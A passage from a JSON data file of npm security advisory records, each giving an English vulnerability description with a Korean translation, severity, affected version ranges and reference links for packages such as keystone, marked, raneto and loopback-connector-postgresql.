    "updatedAt": "2023-01-09T05:01:55Z",
    "publishedAt": "2020-08-20T17:21:46Z",
    "withdrawnAt": "2020-08-20T17:21:46Z",
    "references": "https://github.com/keystonejs/keystone/pull/4478\nhttps://github.com/keystonejs/keystone/commit/8ecb80960ffd2ae2f241b0bbb62367821a79ff63\nhttps://www.npmjs.com/advisories/980\nhttps://github.com/advisories/GHSA-h29r-4vqp-8jxf",
    "name": "keystone",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.0",
    "identifier": "4.0.0",
    "descriptionKR": "철회: GHSA-7qcx-jmrc-h2rr의 복제본"
  },
  {
    "description": "Serve Handler, before 5.0.3, has a XSS via HTML tag injection in directory lisiting page.",
    "identifiers": "GHSA : GHSA-9vhv-p9r7-rm53",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:39Z",
    "publishedAt": "2021-02-23T21:37:48Z",
    "withdrawnAt": "2021-02-23T21:37:48Z",
    "references": "https://github.com/zeit/serve-handler/commit/65b4d4183a31a8076c78c40118acb0ca1b64f620\nhttps://hackerone.com/reports/398285\nhttps://github.com/advisories/GHSA-9vhv-p9r7-rm53",
    "name": "serve-handler",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.0.3",
    "identifier": "5.0.3",
    "descriptionKR": "5.0.3 이전의 Serve Handler에는 디렉토리 나열 페이지에 HTML 태그 삽입을 통한 XSS가 있습니다."
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-f522-ffg8-j8r6",
    "identifiers": "GHSA : GHSA-4x7c-cx64-49w8",
    "severity": "LOW",
    "updatedAt": "2023-01-09T05:01:36Z",
    "publishedAt": "2020-08-19T22:06:03Z",
    "withdrawnAt": "2020-08-19T22:06:03Z",
    "references": "https://github.com/mafintosh/is-my-json-valid/pull/159\nhttps://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976\nhttps://github.com/advisories/GHSA-4x7c-cx64-49w8",
    "name": "is-my-json-valid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.4.1",
    "identifier": "1.4.1",
    "descriptionKR": "철회: GHSA-f522-ffg8-j8r6의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-f522-ffg8-j8r6",
    "identifiers": "GHSA : GHSA-4x7c-cx64-49w8",
    "severity": "LOW",
    "updatedAt": "2023-01-09T05:01:36Z",
    "publishedAt": "2020-08-19T22:06:03Z",
    "withdrawnAt": "2020-08-19T22:06:03Z",
    "references": "https://github.com/mafintosh/is-my-json-valid/pull/159\nhttps://github.com/mafintosh/is-my-json-valid/commit/b3051b277f7caa08cd2edc6f74f50aeda65d2976\nhttps://github.com/advisories/GHSA-4x7c-cx64-49w8",
    "name": "is-my-json-valid",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.17.2",
    "identifier": "2.17.2",
    "descriptionKR": "철회: GHSA-f522-ffg8-j8r6의 복제본"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-xmc8-cjfr-phx3",
    "identifiers": "GHSA : GHSA-m45f-4828-5cv5",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:41Z",
    "publishedAt": "2020-08-19T22:39:44Z",
    "withdrawnAt": "2020-08-19T22:39:44Z",
    "references": "https://github.com/highcharts/highcharts/commit/7c547e1e0f5e4379f94396efd559a566668c0dfa\nhttps://www.npmjs.com/advisories/793\nhttps://github.com/advisories/GHSA-m45f-4828-5cv5",
    "name": "highcharts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.1.0",
    "identifier": "6.1.0",
    "descriptionKR": "철회: GHSA-xmc8-cjfr-phx3의 복제본"
  },
  {
    "description": "Versions 0.3.2 and earlier of marked are affected by a cross-site scripting vulnerability even when sanitize:true is set.",
    "identifiers": "GHSA : GHSA-32vw-r77c-gm67",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:41Z",
    "publishedAt": "2020-08-03T17:57:05Z",
    "withdrawnAt": "2020-08-03T17:57:05Z",
    "references": "https://github.com/markedjs/marked/issues/492\nhttps://github.com/markedjs/marked/commit/fc372d1c6293267722e33f2719d57cebd67b3da1\nhttps://www.npmjs.com/advisories/24\nhttps://www.npmjs.com/advisories/24/versions\nhttps://github.com/advisories/GHSA-32vw-r77c-gm67",
    "name": "marked",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.3",
    "identifier": "0.3.3",
    "descriptionKR": "0.3.2 및 이전 버전의 mark는 sanitize:true가 설정된 경우에도 크로스 사이트 스크립팅 취약점의 영향을 받습니다."
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-hgch-jjmr-gp7w",
    "identifiers": "GHSA : GHSA-69p9-9qm9-h447",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:42Z",
    "publishedAt": "2020-08-19T22:34:43Z",
    "withdrawnAt": "2020-08-19T22:34:43Z",
    "references": "https://github.com/commenthol/safer-eval/commit/1c29f6a6e304fb650c05056e217e457a0d2cc3c5\nhttps://www.npmjs.com/advisories/787\nhttps://www.npmjs.com/advisories/787/versions\nhttps://github.com/advisories/GHSA-69p9-9qm9-h447",
    "name": "safer-eval",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.2",
    "identifier": "1.3.2",
    "descriptionKR": "철회: GHSA-hgch-jjmr-gp7w 중복"
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-qmm9-x5gr-4gfm",
    "identifiers": "GHSA : GHSA-c5j4-vw9m-xc95",
    "severity": "LOW",
    "updatedAt": "2023-01-09T05:01:22Z",
    "publishedAt": "2020-08-27T22:44:08Z",
    "withdrawnAt": "2020-08-27T22:44:08Z",
    "references": "https://github.com/herber/hekto/pull/3\nhttps://github.com/herber/hekto/commit/1e5c75f8259ba0daf9b2600db3c246cda1934c46\nhttps://hackerone.com/reports/320693\nhttps://www.npmjs.com/advisories/669\nhttps://github.com/advisories/GHSA-c5j4-vw9m-xc95",
    "name": "hekto",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.4",
    "identifier": "0.2.4",
    "descriptionKR": "철회: GHSA-qmm9-x5gr-4gfm 사본"
  },
  {
    "description": "Affected versions of node-simple-router package (0.10.0 and before), are vulnerable to a directory traversal issue.",
    "identifiers": "GHSA : GHSA-f6gj-7592-5jxm",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:24Z",
    "publishedAt": "2021-02-23T21:33:53Z",
    "withdrawnAt": "2021-02-23T21:33:53Z",
    "references": "https://github.com/sandy98/node-simple-router/commit/dfdd52e2e80607af433097d940b3834fd96df488#diff-b9cfc7f2cdf78a7f4b91a753d10865a2\nhttps://github.com/advisories/GHSA-f6gj-7592-5jxm",
    "name": "node-simple-router",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.10.1",
    "identifier": "0.10.1",
    "descriptionKR": "node-simple-router 패키지의 영향을 받는 버전(0.10.0 이하)은 디렉터리 순회 문제에 취약합니다."
  },
  {
    "description": "Withdrawn: duplicate of GHSA-2m39-62fm-q8r3",
    "identifiers": "GHSA : GHSA-wx84-69jh-jjp2",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:35Z",
    "publishedAt": "2020-08-03T18:22:36Z",
    "withdrawnAt": "2020-08-03T18:22:36Z",
    "references": "https://hackerone.com/reports/319593\nhttps://github.com/joyent/node-sshpk/blob/v1.13.1/lib/formats/ssh.js#L17\nhttps://github.com/advisories/GHSA-wx84-69jh-jjp2",
    "name": "sshpk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.14.0",
    "identifier": "1.14.1",
    "descriptionKR": "철회: GHSA-2m39-62fm-q8r3 사본"
  },
  {
    "description": "Withdrawn: duplicate of GHSA-2m39-62fm-q8r3",
    "identifiers": "GHSA : GHSA-wx84-69jh-jjp2",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:35Z",
    "publishedAt": "2020-08-03T18:22:36Z",
    "withdrawnAt": "2020-08-03T18:22:36Z",
    "references": "https://hackerone.com/reports/319593\nhttps://github.com/joyent/node-sshpk/blob/v1.13.1/lib/formats/ssh.js#L17\nhttps://github.com/advisories/GHSA-wx84-69jh-jjp2",
    "name": "sshpk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.13.2",
    "identifier": "1.13.2",
    "descriptionKR": "철회: GHSA-2m39-62fm-q8r3 사본"
  },
  {
    "description": "There is an authentication weakness vulnerability in keystone before version 0.3.16.  Due to a bug in the the default sign in functionality, incomplete email addresses could be matched. A correct password is still required to complete sign in.",
    "identifiers": "GHSA : GHSA-9xgp-hfw7-73rq",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:24Z",
    "publishedAt": "2020-08-19T21:30:04Z",
    "withdrawnAt": "2020-08-19T21:30:04Z",
    "references": "https://github.com/keystonejs/keystone/issues/1085\nhttps://github.com/advisories/GHSA-9xgp-hfw7-73rq",
    "name": "keystone",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.3.16",
    "identifier": "0.3.16",
    "descriptionKR": "keystone 0.3.16 이전 버전에는 인증 취약점 취약점이 있습니다. 기본 로그인 기능의 버그로 인해 불완전한 이메일 주소가 일치할 수 있습니다. 로그인을 완료하려면 여전히 올바른 암호가 필요합니다."
  },
  {
    "description": "Affected versions of list-n-stream package (0.0.10 and before), are vulnerable to a directory traversal issue.",
    "identifiers": "GHSA : GHSA-26hg-crh6-mjrw",
    "severity": "HIGH",
    "updatedAt": "2023-01-09T05:01:18Z",
    "publishedAt": "2021-02-23T21:28:28Z",
    "withdrawnAt": "2021-02-23T21:28:28Z",
    "references": "https://github.com/KoryNunn/list-n-stream/commit/99b0b40b34aaedfcdf25da46bef0a06b9c47fb59#diff-78c12f5adc1848d13b1c6f07055d996e\nhttps://github.com/advisories/GHSA-26hg-crh6-mjrw",
    "name": "list-n-stream",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.11",
    "identifier": "0.0.11",
    "descriptionKR": "list-n-stream 패키지의 영향을 받는 버전(0.0.10 이하)은 디렉터리 순회 문제에 취약합니다."
  },
  {
    "description": "Withdrawn: Duplicate of GHSA-jcw8-r9xm-32c6",
    "identifiers": "GHSA : GHSA-c6h2-mpc6-232h",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:24Z",
    "publishedAt": "2020-08-27T22:26:15Z",
    "withdrawnAt": "2020-08-27T22:26:15Z",
    "references": "https://github.com/skoranga/node-dns-sync/commit/d9abaae384b198db1095735ad9c1c73d7b890a0d\nhttps://www.npmjs.com/advisories/153\nhttps://www.npmjs.com/advisories/523\nhttps://github.com/advisories/GHSA-c6h2-mpc6-232h",
    "name": "dns-sync",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.1.3",
    "identifier": "0.1.3",
    "descriptionKR": "철회: GHSA-jcw8-r9xm-32c6의 복제본"
  },
  {
    "description": "Versions of aedes before 0.35.1 does not respect its own authorization rules when a client sets a Last Will.",
    "identifiers": "GHSA : GHSA-5hx7-77g4-wqx3",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:24Z",
    "publishedAt": "2021-02-23T21:30:56Z",
    "withdrawnAt": "2021-02-23T21:30:56Z",
    "references": "https://github.com/mcollina/aedes/issues/211\nhttps://github.com/mcollina/aedes/commit/ffbc1702bb24b596afbb96407cc6db234a4044a8\nhttps://github.com/advisories/GHSA-5hx7-77g4-wqx3",
    "name": "aedes",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.1.0, < 0.35.1",
    "identifier": "0.35.1",
    "descriptionKR": "0.35.1 이전의 aedes 버전은 클라이언트가 Last Will을 설정할 때 자체 권한 부여 규칙을 준수하지 않습니다."
  },
  {
    "description": "**Withdrawn:** Duplicate of GHSA-vcjj-xf2r-mwvc.\n\nKnockout, before 3.5.0-beta, has an XSS injection point in attr name binding for browser IE7 and older.",
    "identifiers": "GHSA : GHSA-qfmr-6qvh-49gm",
    "severity": "MODERATE",
    "updatedAt": "2023-01-09T05:01:24Z",
    "publishedAt": "2021-02-25T01:44:38Z",
    "withdrawnAt": "2021-02-25T01:44:38Z",
    "references": "https://github.com/knockout/knockout/issues/1244\nhttps://github.com/knockout/knockout/commit/86b06aa8633f9f72b953f512df7471a22689ea14\nhttps://github.com/advisories/GHSA-qfmr-6qvh-49gm",
    "name": "knockout",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.5.0",
    "identifier": "3.5.0",
    "descriptionKR": "**철회:** GHSA-vcjj-xf2r-mwvc의 복제본.\n\n3.5.0-beta 이전의 Knockout에는 브라우저 IE7 및 이전 버전의 attr 이름 바인딩에 XSS 삽입 지점이 있습니다."
  },
  {
    "description": "All versions of package mc-kill-port are vulnerable to Arbitrary Command Execution via the `kill` function, due to missing sanitization of the `port` argument.",
    "identifiers": "GHSA : GHSA-2cg4-7q4x-7rr2\nCVE : CVE-2022-25973",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:06:28Z",
    "publishedAt": "2022-08-11T00:00:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25973\nhttps://security.snyk.io/vuln/SNYK-JS-MCKILLPORT-2419070\nhttps://www.npmjs.com/package/mc-kill-port\nhttps://github.com/advisories/GHSA-2cg4-7q4x-7rr2",
    "name": "mc-kill-port",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.0.1",
    "descriptionKR": "패키지 mc-kill-port의 모든 버전은 `port` 인수의 삭제 누락으로 인해 `kill` 기능을 통한 임의 명령 실행에 취약합니다."
  },
  {
    "description": "An issue in Renato v0.17.0 allows attackers to cause a Denial of Service (DoS) via a crafted payload injected into the `Search` parameter.",
    "identifiers": "GHSA : GHSA-xxc2-j7jj-6g5m\nCVE : CVE-2022-35142",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:01:24Z",
    "publishedAt": "2022-08-05T00:00:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-35142\nhttps://cwe.mitre.org/data/definitions/703.html\nhttps://gainsec.com/2022/08/04/cve-2022-35142-cve-2022-35143-cve-2022-35144/\nhttps://github.com/gilbitron/Raneto/releases\nhttp://raneto.com/\nhttps://github.com/ryanlelek/Raneto/issues/368\nhttps://github.com/ryanlelek/Raneto/pull/370\nhttps://github.com/ryanlelek/Raneto/releases/tag/0.17.1\nhttps://github.com/advisories/GHSA-xxc2-j7jj-6g5m",
    "name": "raneto",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.17.0",
    "identifier": "0.17.1",
    "descriptionKR": "Renato v0.17.0의 문제로 인해 공격자는 'Search' 매개변수에 삽입된 조작된 페이로드를 통해 서비스 거부(DoS)를 유발할 수 있습니다."
  },
  {
    "description": "Improper input validation on the `contains` LoopBack filter may allow for arbitrary SQL injection.\n\n### Impact\n\nWhen the extended filter property `contains` is permitted to be interpreted by the Postgres connector, it is possible to inject arbitrary SQL which may affect the confidentiality and integrity of data stored on the connected database.\n\nThis affects users who does any of the following:\n\n- Connect to the database via the DataSource with `allowExtendedProperties: true` setting OR\n- Uses the connector's CRUD methods directly OR\n- Uses the connector's other methods to interpret the LoopBack filter.\n\n### Patches\n\nPatch release `loopback-connector-postgresql@5.5.1` has been published of which resolves this issue.\n\n### Workarounds\n\nUsers who are unable to upgrade should do the following if applicable:\n\n- Remove `allowExtendedProperties: true` DataSource setting\n- Add `allowExtendedProperties: false` DataSource setting\n- When passing directly to the connector functions, manually sanitize the user input for the `contains` LoopBack filter beforehand.\n\n",
    "identifiers": "GHSA : GHSA-j259-6c58-9m58\nCVE : CVE-2022-35942",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:06:49Z",
    "publishedAt": "2022-08-11T21:13:43Z",
    "references": "https://github.com/loopbackio/loopback-connector-postgresql/security/advisories/GHSA-j259-6c58-9m58\nhttps://github.com/loopbackio/loopback-connector-postgresql/commit/d57406c6737692a3a106b58a35406290cddb23e5\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-35942\nhttps://github.com/advisories/GHSA-j259-6c58-9m58",
    "name": "loopback-connector-postgresql",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 5.5.1",
    "identifier": "5.5.1",
    "descriptionKR": "`contains` LoopBack 필터에 대한 부적절한 입력 유효성 검사는 임의의 SQL 주입을 허용할 수 있습니다.\n\n### 영향\n\n확장 필터 속성 'contains'가 Postgres 커넥터에 의해 해석되도록 허용되면 연결된 데이터베이스에 저장된 데이터의 기밀성과 무결성에 영향을 줄 수 있는 임의의 SQL을 주입할 수 있습니다.\n\n이는 다음 중 하나를 수행하는 사용자에게 영향을 미칩니다.\n\n- `allowExtendedProperties: true` 설정으로 DataSource를 통해 데이터베이스에 연결하거나\n- 커넥터의 CRUD 방법을 직접 사용하거나\n- 커넥터의 다른 방법을 사용하여 LoopBack 필터를 해석합니다.\n\n### 패치\n\n이 문제를 해결하는 패치 릴리스 `loopback-connector-postgresql@5.5.1`이 게시되었습니다.\n\n### 해결 방법\n\n업그레이드할 수 없는 사용자는 해당되는 경우 다음을 수행해야 합니다.\n\n- `allowExtendedProperties: true` DataSource 설정 제거\n- `allowExtendedProperties: false` DataSource 설정 추가\n- 커넥터 기능에 직접 전달하는 경우 `contains` LoopBack 필터에 대한 사용자 입력을 사전에 수동으로 삭제하십시오."
  },
  {
    "description": "The package ts-deepmerge before version 2.0.2 is vulnerable to Prototype Pollution due to missing sanitization of the `merge` function.",
    "identifiers": "GHSA : GHSA-7qqq-gh2f-wq76\nCVE : CVE-2022-25907",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-27T05:07:13Z",
    "publishedAt": "2022-08-10T00:00:31Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25907\nhttps://github.com/voodoocreation/ts-deepmerge/commit/9be5148773343c57be9de39728d6ead18eddf10b\nhttps://github.com/voodoocreation/ts-deepmerge/releases/tag/2.0.2\nhttps://security.snyk.io/vuln/SNYK-JS-TSDEEPMERGE-2959975\nhttps://github.com/advisories/GHSA-7qqq-gh2f-wq76",
    "name": "ts-deepmerge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.2",
    "identifier": "2.0.2",
    "descriptionKR": "버전 2.0.2 이전의 패키지 ts-deepmerge는 `merge` 기능의 삭제 누락으로 인해 Prototype Pollution에 취약합니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package npos-tesseract. The injection point is located in line 55 in lib/ocr.js.",
    "identifiers": "GHSA : GHSA-mpwp-pf96-9g4r\nCVE : CVE-2020-28453",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:01:19Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28453\nhttps://security.snyk.io/vuln/SNYK-JS-NPOSTESSERACT-1051031\nhttps://github.com/advisories/GHSA-mpwp-pf96-9g4r",
    "name": "npos-tesseract",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.3",
    "descriptionKR": "명령 삽입 취약점은 npos-tesseract 패키지의 모든 버전에 영향을 미칩니다. 삽입 지점은 lib/ocr.js의 55행에 있습니다."
  },
  {
    "description": "The package @acrontum/filesystem-template before 0.0.2 is vulnerable to Arbitrary Command Injection due to the fetchRepo API missing sanitization of the href field of external input.",
    "identifiers": "GHSA : GHSA-m2fc-9h5m-29cm\nCVE : CVE-2022-21186",
    "severity": "CRITICAL",
    "updatedAt": "2023-08-08T21:12:16Z",
    "publishedAt": "2022-08-06T00:00:51Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21186\nhttps://github.com/acrontum/filesystem-template/pull/14/commits/baeb727b60991ad82d9e63ac660883793abc0acc\nhttps://security.snyk.io/vuln/SNYK-JS-ACRONTUMFILESYSTEMTEMPLATE-2419071\nhttps://github.com/acrontum/filesystem-template/issues/13\nhttps://github.com/acrontum/filesystem-template/commit/baeb727b60991ad82d9e63ac660883793abc0acc\nhttps://github.com/advisories/GHSA-m2fc-9h5m-29cm",
    "name": "@acrontum/filesystem-template",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.0.2",
    "identifier": "0.0.2",
    "descriptionKR": "0.0.2 이전의 @acrontum/filesystem-template 패키지는 외부 입력의 href 필드 삭제가 없는 fetchRepo API로 인해 임의 명령 삽입에 취약합니다."
  },
  {
    "description": "Raneto v0.17.0 employs weak password complexity requirements, allowing attackers to crack user passwords via brute-force attacks. Version 0.17.1 contains security mitigations for this and other vulnerabilities.",
    "identifiers": "GHSA : GHSA-7942-2fx8-qhpf\nCVE : CVE-2022-35143",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-31T05:01:22Z",
    "publishedAt": "2022-08-05T00:00:23Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-35143\nhttps://cwe.mitre.org/data/definitions/521.html\nhttps://gainsec.com/2022/08/04/cve-2022-35142-cve-2022-35143-cve-2022-35144/\nhttps://github.com/gilbitron/Raneto/releases\nhttp://raneto.com/\nhttps://github.com/ryanlelek/Raneto/pull/370\nhttps://github.com/ryanlelek/Raneto/commit/55e442c9bc67b845094e14ceb228e95c639595be\nhttps://github.com/ryanlelek/Raneto/releases/tag/0.17.1\nhttps://github.com/advisories/GHSA-7942-2fx8-qhpf",
    "name": "raneto",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.17.0",
    "identifier": "0.17.1",
    "descriptionKR": "Raneto v0.17.0은 약한 암호 복잡성 요구 사항을 사용하여 공격자가 무차별 대입 공격을 통해 사용자 암호를 해독할 수 있도록 합니다. 버전 0.17.1에는 이 취약점과 기타 취약점에 대한 보안 완화가 포함되어 있습니다."
  },
  {
    "description": "### Impact\n\nTemporary repository tokens were leaked into Pull Requests comments in during certain Go Modules update failure scenarios.\n\n### Patches\n\nThe problem has been patched. Self-hosted users should upgrade to v19.38.7 or later.\n\n### Workarounds\n\nDisable Go Modules support.\n\n### References\n\nBlog post: https://renovatebot.com/blog/go-modules-vulnerability-disclosure\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Renovate](http://github.com/renovatebot/renovate)\n",
    "identifiers": "GHSA : GHSA-v7x3-7hw7-pcjg",
    "severity": "MODERATE",
    "updatedAt": "2023-01-07T05:02:58Z",
    "publishedAt": "2019-10-21T16:02:33Z",
    "references": "https://github.com/renovatebot/renovate/security/advisories/GHSA-v7x3-7hw7-pcjg\nhttps://github.com/advisories/GHSA-v7x3-7hw7-pcjg\nhttps://snyk.io/vuln/SNYK-JS-RENOVATE-536203",
    "name": "renovate",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 13.87.0, < 19.38.7",
    "identifier": "19.38.7",
    "descriptionKR": "### 영향\n\n특정 Go Modules 업데이트 실패 시나리오에서 임시 리포지토리 토큰이 풀 요청 주석으로 유출되었습니다.\n\n### 패치\n\n문제가 패치되었습니다. 자체 호스팅 사용자는 v19.38.7 이상으로 업그레이드해야 합니다.\n\n### 해결 방법\n\nGo 모듈 지원을 비활성화합니다.\n\n### 참조\n\n블로그 게시물: https://renovatebot.com/blog/go-modules-vulnerability-disclosure\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [Renovate](http://github.com/renovatebot/renovate)에서 이슈 열기"
  },
  {
    "description": "Hexo versions 0.0.1 to 5.4.0 are vulnerable against stored XSS. The post “body” and “tags” don’t sanitize malicious javascript during web page generation. Local unprivileged attacker can inject arbitrary code.",
    "identifiers": "GHSA : GHSA-q54r-r9pr-w7qv\nCVE : CVE-2021-25987",
    "severity": "MODERATE",
    "updatedAt": "2023-01-29T05:02:40Z",
    "publishedAt": "2021-12-01T18:27:44Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-25987\nhttps://github.com/hexojs/hexo/commit/5170df2d3fa9c69e855c4b7c2b084ebfd92d5200\nhttps://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25987\nhttps://github.com/hexojs/hexo/issues/4838\nhttps://github.com/hexojs/hexo/pull/4750\nhttps://github.com/advisories/GHSA-q54r-r9pr-w7qv",
    "name": "hexo",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 0.0.1, <= 5.4.0",
    "identifier": "6.0.0",
    "descriptionKR": "Hexo 버전 0.0.1~5.4.0은 저장된 XSS에 취약합니다. 게시물 \"본문\" 및 \"태그\"는 웹 페이지 생성 중에 악성 자바스크립트를 삭제하지 않습니다. 권한이 없는 로컬 공격자는 임의의 코드를 주입할 수 있습니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of the package curljs.",
    "identifiers": "GHSA : GHSA-cqfc-9452-r36j\nCVE : CVE-2020-28425",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:21Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28425\nhttps://security.snyk.io/vuln/SNYK-JS-CURLJS-1050404\nhttps://github.com/advisories/GHSA-cqfc-9452-r36j",
    "name": "curljs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.2",
    "descriptionKR": "명령 주입 취약점은 curljs 패키지의 모든 버전에 영향을 미칩니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of the package node-latex-pdf.",
    "identifiers": "GHSA : GHSA-32fw-9wq8-9x9c\nCVE : CVE-2020-28433",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:21Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28433\nhttps://security.snyk.io/vuln/SNYK-JS-NODELATEXPDF-1050426\nhttps://github.com/advisories/GHSA-32fw-9wq8-9x9c",
    "name": "node-latex-pdf",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.2",
    "descriptionKR": "명령 삽입 취약점은 node-latex-pdf 패키지의 모든 버전에 영향을 미칩니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package gitblame. The injection point is located in line 15 in lib/gitblame.js.",
    "identifiers": "GHSA : GHSA-3486-rvxc-hrrj\nCVE : CVE-2020-28434",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:21Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28434\nhttps://security.snyk.io/vuln/SNYK-JS-GITBLAME-1050430\nhttps://github.com/xjamundx/gitblame/blob/master/lib/gitblame.js#L15\nhttps://github.com/advisories/GHSA-3486-rvxc-hrrj",
    "name": "gitblame",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.1.1",
    "descriptionKR": "명령 주입 취약점은 패키지 gitblame의 모든 버전에 영향을 미칩니다. 주입 지점은 lib/gitblame.js의 15번째 줄에 있습니다."
  },
  {
    "description": "A command injection vulnerability affects the package image-tiler before version 2.0.2.",
    "identifiers": "GHSA : GHSA-mrxv-pr4h-963q\nCVE : CVE-2020-28451",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:21Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28451\nhttps://github.com/MrP/image-tiler/commit/f4a0b13a4bf43655fc4013e04bbceaf77aecbeb8\nhttps://security.snyk.io/vuln/SNYK-JS-IMAGETILER-1051029\nhttps://github.com/advisories/GHSA-mrxv-pr4h-963q",
    "name": "image-tiler",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.0.2",
    "descriptionKR": "명령 주입 취약점은 버전 2.0.2 이전의 패키지 이미지 타일러에 영향을 미칩니다."
  },
  {
    "description": "A command injection vulnerability affects all versions of package heroku-env. The injection point is located in lib/get.js which is required by index.js.",
    "identifiers": "GHSA : GHSA-jp45-65jw-94mj\nCVE : CVE-2020-28437",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:20Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28437\nhttps://security.snyk.io/vuln/SNYK-JS-HEROKUENV-1050432\nhttps://github.com/advisories/GHSA-jp45-65jw-94mj",
    "name": "heroku-env",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.2.0",
    "descriptionKR": "명령 주입 취약점은 패키지 heroku-env의 모든 버전에 영향을 미칩니다. 주입 지점은 index.js에 필요한 lib/get.js에 있습니다."
  },
  {
    "description": "The package get-npm-package-version before 1.0.7 is vulnerable to Command Injection via the `main` function in index.js.",
    "identifiers": "GHSA : GHSA-4h66-vghf-xg5x\nCVE : CVE-2020-7795",
    "severity": "CRITICAL",
    "updatedAt": "2023-01-30T05:01:18Z",
    "publishedAt": "2022-08-03T00:00:57Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-7795\nhttps://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec\nhttps://security.snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390\nhttps://github.com/hoperyy/get-npm-package-version/commit/49459d4a3ce68587d48ffa8dead86fc9ed58e965\nhttps://github.com/hoperyy/get-npm-package-version/blob/338a5882298eb2c2194538db41166cae13c39e03/index.js#L17\nhttps://github.com/advisories/GHSA-4h66-vghf-xg5x",
    "name": "get-npm-package-version",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.7",
    "identifier": "1.0.7",
    "descriptionKR": "1.0.7 이전 패키지 get-npm-package-version은 index.js의 `main` 함수를 통한 명령 주입에 취약합니다."
  },
  {
